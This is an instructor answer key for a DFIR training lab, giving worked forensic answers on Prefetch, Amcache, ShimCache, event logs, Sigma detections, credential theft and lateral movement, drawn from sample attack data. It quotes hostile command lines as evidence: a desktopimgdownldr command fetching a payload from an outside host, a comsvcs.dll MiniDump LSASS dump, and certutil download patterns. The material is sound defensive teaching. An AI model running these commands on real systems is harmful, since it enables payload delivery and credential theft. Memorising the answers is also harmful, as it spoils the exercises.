# Answer Key — DFIR Training Lab (instructor material)

> **⚠️ Instructor / self-check material — spoilers ahead.** Each module's README keeps its "what to find" section deliberately light so learners discover the answers themselves. This file consolidates the *try-it-yourself* exercises from all modules with **worked answers grounded in the real bundled data**. Try every exercise first; read this only to check.
>
> Command-based answers were verified by running each tool on the lab VM against each module's `data/` folder. Real values (hashes, timestamps, event-ID counts) are quoted from that data; where a value is a reasoning point rather than a fixed output, the answer explains the principle.

**Shared facts about the Part A host** (used across Modules 1-4): host `DESKTOP-SDN1RPT`, from DFIR Madness *Case 001 — "The Stolen Szechuan Sauce."* The case malware is `coreupdater.exe`:
- **SHA1** `fd153c66386ca93ec9993d66a84d6f0d129a3a5c`
- **Path** `C:\Windows\System32\coreupdater.exe` · **Size** 7,168 bytes · `IsOsComponent = False` · empty ProductName
- **Executed** (Prefetch last run) **2020-09-19 03:40:49 UTC** · Amcache `FileKeyLastWrite` **2020-09-19 03:40:45 UTC** · LinkDate `2010-04-14` (fake)
- **Triad fingerprint:** present in **Amcache** + **Prefetch**, **absent** from **ShimCache**.

---

## Module 1 — Prefetch (PECmd)

**1. Find the LOLBins.**
All four LOLBins are present, and several cluster in the **2020-09-19 early-morning incident window** (verified from `pf.csv`):
- `CMD.EXE` — RunCount **9**, last run **2020-09-19 05:08:37**; earlier runs include 03:43:14, 03:41:06 — i.e. seconds around the malware's 03:40:49 execution.
- `POWERSHELL.EXE` — RunCount **2**, last run **2020-09-19 05:08:43** (runs at 05:08:43 and 05:08:37).
- `RUNDLL32.EXE` — multiple `.pf` (different path hashes). The busy one (`-52A71BD0`) has RunCount **9**, last run **2020-09-19 05:08:50**, with a run at **03:40:45** — right beside `coreupdater.exe`. Others last-ran 2020-09-18.
- `WSCRIPT.EXE` — RunCount **1**, last run **2020-09-19 01:08:25**.
Yes — `cmd`, `rundll32`, and (slightly later) `powershell` all cluster in the 03:13-05:09 window of 2020-09-19, the same window in which `coreupdater.exe` ran.

**2. Inspect the malware's loaded files.**
`PECmd.exe -f prefetch/COREUPDATER.EXE-157C54BB.pf` shows RunCount **1**, last run **2020-09-19 03:40:49.410 UTC**, and **51 filenames loaded**. The point of the exercise is to read that Filenames list for any path under `\Temp\`, `\AppData\`, `\Users\Public\`, or other non-System32 locations — a DLL or data file loaded from a user-writable folder is a side-loading / staging red flag. (The binary itself lives in `System32`, the masquerade; you confirm its identity by SHA1 in Module 3.)

**3. Meet a real corrupt artifact.**
Running `PECmd.exe -f prefetch/VSSVC.EXE-6C8F0C66.pf` makes PECmd report a **parsing error** for that file — it is genuinely corrupt. When you parse the whole folder with `PECmd.exe -d prefetch --csv . --csvf prefetch.csv`, PECmd logs that single failure (flagging the row with a parsing-error note) but still processes the other **196** files. Correct real-world handling: **document the damaged artifact (name it, note it's unreadable) and move on** — one bad file doesn't stop the case. 196 of 197 parse cleanly.

**4. Run-count reasoning.**
Any program whose `RunCount` exceeds the number of *real* (non-`1601-01-01`) timestamps in `AllRunTimes`. Example from `pf.csv`: `CMD.EXE` shows RunCount **9** but only **8** timestamp slots exist. **Why:** Prefetch stores only the **last 8 run times**; a program run more than 8 times keeps an accurate *count* but has lost the older timestamps (and unused slots read as the epoch `1601-01-01 00:00:00`).

**5. The 10-second rule.**
The real execution time is the **`LastRun` recorded inside the `.pf`** (e.g. `coreupdater.exe` = 03:40:49). The file's on-disk creation time is roughly **10 seconds later**, because Windows finishes writing the Prefetch file only after the program has run ~10 seconds. So you timeline on the in-file run time, not the filesystem timestamp.

---

## Module 2 — ShimCache (AppCompatCacheParser)

**1. Top of the cache.**
`CacheEntryPosition 0` (most-recently-inserted) is `C:\Windows\System32\WScript.exe` — the **LOLBin script host**. It sits at the top because the cache is ordered most-recent-first, so whatever the OS most recently evaluated leads. A script host at position 0 is worth a glance: it's a common malware launch vector.

**2. Staging sweep.**
For each `Temp`/`AppData` hit decide benign vs suspicious by **who owns the folder, the file name, and whether it's a known Microsoft component**. Example seen in the data: `C:\ProgramData\Microsoft\Windows Defender\platform\...\MpCmdRun.exe` — in a `platform` versioned folder, a signed Defender component → **benign**. A random-named `.exe` in a *user's* `\AppData\Local\Temp\` would be the opposite. The path tells the story.

**3. Prove the gap.**
`grep -i coreupdater shimcache.csv` → **no hits.** `coreupdater.exe` is **absent from ShimCache**. One-sentence Triad answer: *its absence from ShimCache does **not** clear it — Prefetch and Amcache already prove it ran and exist with a known-bad SHA1; ShimCache simply has a blind spot here, which is exactly why you read all three artifacts.*

**4. Cross-check a modify time.**
The teaching point: a ShimCache `LastModifiedTimeUTC` (the file's `$StandardInfo` modified time) and Amcache's timestamps describe **different events**, so they needn't match. **Agreement** raises confidence the file wasn't tampered; a **mismatch** can indicate timestomping (an attacker backdating a file) — worth investigating, not proof by itself.

**5. Why the logs matter.**
Re-running with `--nl` (no transaction logs) ignores `SYSTEM.LOG1/.LOG2`, so the most-recent, not-yet-flushed entries are missed and the count can **drop**. The default (replaying the logs) is what you want, because a live-collected hive is "dirty" — the newest evidence is in the logs.

---

## Module 3 — Amcache (AmcacheParser)

**1. Build the identity card.**
`coreupdater.exe` (from `amcache_UnassociatedFileEntries.csv`):
- Path `c:\windows\system32\coreupdater.exe`
- **SHA1 `fd153c66386ca93ec9993d66a84d6f0d129a3a5c`**
- Size **7,168 bytes** · `IsOsComponent` **False** · ProductName **empty** · LinkDate `2010-04-14 22:06:53` (implausible/fake) · `FileKeyLastWrite` **2020-09-19 03:40:45 UTC** (incident window)
Every reason it's suspicious: a System32-named binary that is **not** an OS component, **no** product metadata, a tiny 7 KB size, inventoried in the incident window, masquerading as an updater. **The one field for a threat-intel lookup: the SHA1.**

**2. Spot the responder's tool.**
`FTK Imager.exe` appears run from `E:\` (a removable/responder drive). Its presence does **not** indicate compromise because it's the **incident responder's own forensic imaging tool**, run from external media during collection — expected responder activity, not attacker activity. (Good reminder to track your own tools so you don't chase them.)

**3. LinkDate humility.**
`coreupdater.exe`'s LinkDate is 2010 — but genuine Microsoft binaries in the same hive (`MoUsoCoreWorker.exe`, `SIHClient.exe`, `winlogon.exe`) have their own scattered/odd LinkDates too. Lesson: **LinkDate is attacker-controllable and frequently nonsensical even for legit files — weight it lightly; never convict on it.**

**4. Corroborate timing.**
Amcache `FileKeyLastWrite` **03:40:45** vs Prefetch last-run **03:40:49** on 2020-09-19 — they agree to within seconds. Agreement across two independent artifacts (inventory vs execution) **hardens the timeline**: the file was present *and* executed at the same moment, which is far stronger than either alone.

**5. Prep the hunt.**
Hypothesis to carry into Module 4: *"SHA1 `fd153c66…` is the Case 001 malware; if I stack this hash across the fleet, every host where it appears is compromised, and its rarity (low count) makes it stand out from ubiquitous OS binaries."*

---

## Module 4 — Scaling the hunt (AppCompatProcessor)

**1. Find the outlier, the right way.**
`coreupdater.exe` in `C:\Windows\System32\`: empty ProductName/Version, **7,168 bytes**, `IsOsComponent=False`, **SHA1 `fd153c66386ca93ec9993d66a84d6f0d129a3a5c`**, **Count = 1** across the three hosts (verified: present on `DESKTOP`, absent on `WORKSTATION07`/`12`). Its **2010 LinkDate is *not*** on the suspicion list because LinkDate is forgeable and genuine MS files here have wilder dates.

**2. Hash beats name.**
Stacking on **SHA1** is stronger because the hash is the file's content fingerprint. An attacker can beat a **name** stack by renaming the binary on each host (`coreupdater.exe` → `svc_update.exe` → …), making every name Count = 1 — but the **identical bytes share one SHA1**, so a hash stack still groups and counts them as the same file.

**3. The benign Count=1 trap.**
Rarity alone returned `chrome.exe`, `firefox.exe`, `code.exe`, **and** `coreupdater.exe` all at Count = 1 — legitimate per-host apps are *also* rare. So rarity only produced a **candidate list**; what convicted `coreupdater.exe` was the **metadata** (System32 path + not-an-OS-component + empty product info + 7 KB + incident-window timing). *Rarity finds candidates; metadata convicts.*

**4. Triad gap, mechanised.**
`grep -i coreupdater shimcache_host-DESKTOP.csv` → **no hits** — not in ShimCache. "In Amcache, not in ShimCache" means you have its **identity** (SHA1) and (via Prefetch) its **execution**, but no "OS-evaluated-the-path" record — a normal Triad gap, not exoneration.

**5. Plan the fleet hunt.**
One-sentence LFO hypothesis: *"The host(s) where SHA1 `fd153c66…` appears at low frequency are the infected boxes; ubiquitous Microsoft-signed System32 binaries are the high-count noise to ignore."* Command shape:
`AppCompatProcessor.py <db> stack "FileName,Sha1"` — run across all 500 hosts' ingested Amcache/AppCompat data; the rows with the malware's SHA1 and a tiny count are your lead list.

**6. (Stretch) Add a host, watch Count move.**
Copying a `WORKSTATION` CSV in as a fourth host and re-running Stack 1 makes a shared OS binary's `Count` rise (3 → 4) while `coreupdater.exe` stays at 1 — a live demonstration that stacking separates ubiquitous noise from rare leads.

---

## Module 5 — Event logs (EvtxECmd)

**1. The 3-line story (sorted timeline).**
After `EvtxECmd -d . --csv ...` and sorting by `TimeCreated`, the desktopimgdownldr attack reads: (1) `desktopimgdownldr.exe` is launched (Sysmon 1) with `/lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr` — a LOLBAS abusing a lockscreen-image feature to download; (2) the **BITS** service actually performs the fetch (BITS-Client 59/60); (3) a `.7z` archive lands on disk — staging for the next stage. The same URL appears in two channels.

**2. Grep for the hostname.**
`grep -i uguu.se events.csv` → the host `a.uguu.se` appears in **two channels** — the **Sysmon 1** command line *and* the **BITS** job. Corroboration across logs is stronger than one hit because a single source can be disabled, cleared, or spoofed; two independent records of the same download make the finding very hard to dispute. (Verified: the command line is `desktopimgdownldr.exe /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr`.)

**3. Pull the full Execution category.**
With `get-data.sh` (online host) you fetch the whole EVTX-ATTACK-SAMPLES *Execution* set and can repeat the parse with `-d` to find other LOLBAS downloaders — e.g. `certutil -urlcache -f http://...` or `rundll32` URL-fetch samples. The skill is recognising the *download-via-trusted-binary* pattern regardless of which LOLBin.

**4. CSV vs JSON.**
`--json` is for **tooling** — hand it to a teammate's script/SIEM ingest where structured fields are parsed programmatically. `--csv` is for **humans** — open it in Timeline Explorer (or a spreadsheet) to sort, filter, and eyeball a timeline. Same data, different consumer.

---

## Module 6 — Sigma hunting (Chainsaw & Hayabusa)

**1. Name them all.**
Across the 23 samples the detections name techniques such as: **Mimikatz** hash-dump (`mimikatz-privesc-hashdump`, `…privilegedebug-tokenelevate-hashdump`), **Invoke-Obfuscation** encoded PowerShell (`Powershell-Invoke-Obfuscation-*`), **PowerSploit / PS-Attack** frameworks, **password-spray / SMB password-guessing** (`password-spray`, `smb-password-guessing-security`), **PsExec** lateral movement (`metasploit-psexec-*`, `sysmon_privesc_psexec_dwell`), **UAC bypass** (`UACME_59_Sysmon`), **event-log tampering** (`disablestop-eventlog`, `eventlog-dac`), and **account creation** (`new-user-security`). (Pure **WMI/DCOM** lateral movement is covered in Module 8.)

**2. Tell the story (PsExec).**
Sorting `sysmon_privesc_psexec_dwell.evtx` by timestamp: a process connects to the target, a service/pipe `\PSEXESVC` appears, and a child process runs **as SYSTEM** — i.e. *remote connection → PsExec service/pipe → SYSTEM-level command execution*. That's PsExec lateral movement to SYSTEM in three beats.

**3. Tune severity.**
`--min-level high` shows only the loudest, highest-confidence alerts (low noise, but you can **miss** quieter techniques like recon or a single suspicious logon); `--min-level low` surfaces far more, including benign-ish noise. Start triage at **medium** (or low with discipline) and escalate — *stopping at "high only" is risky* because real intrusions hide in the medium/low band.

**4. Cross-tool check.**
On `mimikatz-privesc-hashdump.evtx`, Hayabusa's top alert and Chainsaw's named rule should **agree** on the credential-dumping technique. When they differ it's usually because they ship **different rule sets / naming**, not because one is wrong — which is exactly why you **run both**: each catches things the other misses.

---

## Module 7 — Identity & credential theft

**1. Mask-reading.**
The two Mimikatz samples open `lsass.exe` with **different `GrantedAccess` masks from different source images**: `sysmon_3_10_Invoke-Mimikatz_hosted_Github` → mask **`0x143a`**, source `powershell.exe`; `sysmon_10_mimikatz_sekurlsa_logonpasswords` → mask **`0x1010`**, source `mimikatz.exe`. **mask + target** beats process name because attackers rename their tools freely — but the *access they need to read LSASS memory* produces the same tell-tale masks regardless of the executable's name.

**2. LOLBAS hunt.**
In `sysmon_10_comsvcs_minidump_lsass`, the Event 1 command line is the classic `rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID> <outfile> full`. The **`<PID>`** argument names the **LSASS process ID** to dump — `comsvcs.dll`'s `MiniDump` export is the LOLBAS that writes LSASS memory to disk.

**3. DCSync logic.**
In `security_4662_dcsync`, the account requesting **directory replication** is a **user** account (not a Domain Controller's computer account). A *user* asking to replicate password data **is** DCSync (only DCs should replicate); a **DC computer account** doing it is **normal** AD replication. The principal's *type* makes the same 4662 benign or malicious.

**4. Baseline vs. attack.**
Running Chainsaw over the folder, `security_4624_4625_logon_baseline.evtx` produces **zero** detections — it's an ordinary failed-then-successful interactive logon. A quiet baseline is essential because it **proves your rules don't fire on normal activity**: detections you can trust are ones that stay silent on benign data.

**5. Correlate.**
Pulling more `Credential Access` samples, look for a **4624 Logon Type 9 (NewCredentials)** that lines up in time with a dump event — that connects *theft* (LSASS access) to *use* (the stolen creds authenticating elsewhere), the dump→logon chain that turns an alert into a story.

---

## Module 8 — Lateral movement

**1. Service vs logon.**
`LM_Remote_Service02_7045.evtx` contains **three 7045** service-install events; the service names (e.g. `spoolfool`/`spoolsv`/`remotesvc`) **impersonate real Windows services**, but the **ImagePath** gives them away by pointing at `cmd`/`calc` (or a temp path) instead of the genuine service binary. Tying a **7045** to its **4624 Type 3 + 4672** proves the service was installed *by an authenticated, privileged remote session* — neither event alone shows both the *delivery* and *who delivered it*.

**2. DCOM line-up.**
The three DCOM samples map to: `LM_impacket_docmexec_mmc_sysmon_01` → **MMC20.Application**; `LM_sysmon_3_DCOM_ShellBrowserWindow_ShellWindows` → **ShellWindows / ShellBrowserWindow**; `LM_DCOM_MSHTA_LethalHTA_Sysmon_3_1` → **mshta / LethalHTA**. All share parent **`svchost.exe -k DcomLaunch`**. In `LM_dcom_..._10016.evtx` the **failed** activations appear only as **System 10016** (a DCOM permission error) because the activation never spawned a process for Sysmon to log — a *cluster* of 10016 is still a useful lead that someone is probing DCOM.

**3. Pipe rhythm.**
In `lm_sysmon_18_remshell_over_namedpipe.evtx` a **Sysmon 18 (Pipe Connected)** carries a PowerShell shell. Versus Module 6's **17 (Pipe Created)** on `\PSEXESVC`: **created** = a server made the pipe available; **connected** = a client *dialled into* it. **18 (connected)** is the one that means "someone reached in and used it."

**4. Same LogonId.**
In `remote task update 4624 4702 same logonid.evtx` the **4702** (task updated) and a **4624** share one **LogonId**. LogonId is the glue because it ties the task change to **one specific authenticated session** — without it, the task edit could be background noise; with it, you attribute the action to the exact remote logon that performed it.

**5. Find the source IP.**
In `dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx`, an **RdpCoreTS 131** event records the **client IP knocking** (the file name even encodes `168.68.131`-style addressing). **131 is useful even when the logon fails** because it captures the *source of the connection attempt* before authentication — so you see who's probing RDP regardless of success.

---

## Module 9 — PowerShell tradecraft

**1. Obfuscation can't hide intent.**
Reading `ScriptBlockText` in `exec_emotet_ps_4104` and `Powershell_4104_MiniDumpWriteDump_Lsass`, the give-away tokens are `IEX`, `FromBase64String`, `DownloadString` (Emotet downloader) and `MiniDumpWriteDump`, `Get-Process lsass` (the LSASS dump). One sentence: **4104 logs the *decoded* script at compile time, so even a Base64-launched command is recorded in clear — and the decoded text names the malicious intent the encoding tried to hide.**

**2. Same goal, two telemetries.**
`Powershell_4104_MiniDumpWriteDump_Lsass.evtx` caught the dump via **PowerShell 4104** (the script text); `babyshark_mimikatz_powershell.evtx` caught a PowerShell credential dump via **Sysmon 10** (LSASS access). If only **one** source were enabled you'd miss the other view — e.g. with Sysmon off you lose the LSASS-access proof; with PowerShell logging off you lose the script text. Run both.

**3. Spot the injection.**
In `de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx`: a **Sysmon 7** loads `System.Management.Automation.dll` into a **non-PowerShell** process, followed by a burst of **Sysmon 8 (CreateRemoteThread)** — the data shows **82** of them. "Unmanaged PowerShell" is **invisible to 4104** because it never runs `powershell.exe`; it hosts the PowerShell engine inside another process, so only Sysmon (the loaded DLL + injection) sees it.

**4. Evasion first.**
Seeing `DE_Powershell_CLM_Disabled_Sysmon_12` (Constrained Language Mode disable) and `de_powershell_execpolicy_changed_sysmon_13` (ExecutionPolicy flipped) *before* a 4104 burst tells the story: **the attacker is clearing PowerShell's guardrails so a malicious script can run unimpeded** — the tampering is the warning shot before the payload.

**5. Count the rules.**
Running Chainsaw on `Powershell_4104_MiniDumpWriteDump_Lsass.evtx`, **multiple distinct Sigma rules** fire on the **single** 4104 event (e.g. LSASS-dump API, suspicious PowerShell, MiniDump usage). Several independent rules hitting one event **raises confidence** — it's unlikely that several unrelated detections all false-positive on the same benign line.

---

## Module 10 — Sysmon + WEF

**1. Build the tree.**
From `Sysmon_UACME_45.evtx`, list each **Sysmon 1** with its `Image`/`ParentImage` and chain parent→child. Elevation appears **without a `consent.exe` prompt** — that *silent* elevation is the bypass. The **registry 13** event *is* the bypass (it sets an auto-elevation/hijack value); the **process 1** that then runs elevated is the **payoff**.

**2. Two bypasses, different IDs.**
`Sysmon_UACME_45` shows **12/13 (registry)** — a registry-key UAC bypass (hijacking an auto-elevated handler). `Sysmon_UACME_63` shows **7/10 (image load + LSASS access)** — a different bypass that works via DLL loading / process access. Both end in silent elevation, but the **different Sysmon IDs reflect different mechanisms** — registry hijack vs image-based — which is why the ID map matters.

**3. Dump in two views.**
`sysmon_10_11_lsass_memdump.evtx` proves the dump with **Sysmon 10** (`GrantedAccess` on `lsass.exe`) + **Sysmon 11** (the `.dmp` file written); Module 9's `Powershell_4104_MiniDumpWriteDump_Lsass.evtx` proves the *same act* with **4104** (`MiniDumpWriteDump` in the script text). You want **both** sensors because each can be disabled and each shows a different fact (the access/handle vs the actual command).

**4. Default vs Sysmon.**
Parsing both Zerologon files: the **default Security log** uniquely has **4742** (the computer-account change that *is* Zerologon's effect); **Sysmon** uniquely has the **process tree (Sysmon 1)** showing the tool that did it. WEF should forward **both** because neither alone tells the whole story — Security shows the *AD change*, Sysmon shows the *execution*.

**5. WEF design.**
For 200 endpoints: push a **GPO source-initiated subscription** so each host forwards its Security + Sysmon logs; stand up a **collector** with `wecutil qc` and a subscription; everything lands in the collector's **`ForwardedEvents`** channel. Chainsaw/Hayabusa run against the **collector**, not each host, because one central, in-order store is what makes fleet-scale hunting (and Module 4's cross-host stacking) feasible — you can't log into 200 machines per hunt.

**6. (Stretch) More samples.**
Pulling more Sysmon samples with `get-data.sh` and re-running `hayabusa csv-timeline` confirms the **same ID map** (1/3/7/8/10/11/12/13/16/17/18) explains techniques you haven't seen yet — the map generalises, which is the whole point of learning it.

---

*For the integrated, multi-module exercise see **[Module 11 — Capstone](module-11-capstone)**, whose README carries its own guiding questions, walkthrough, and full solution.*
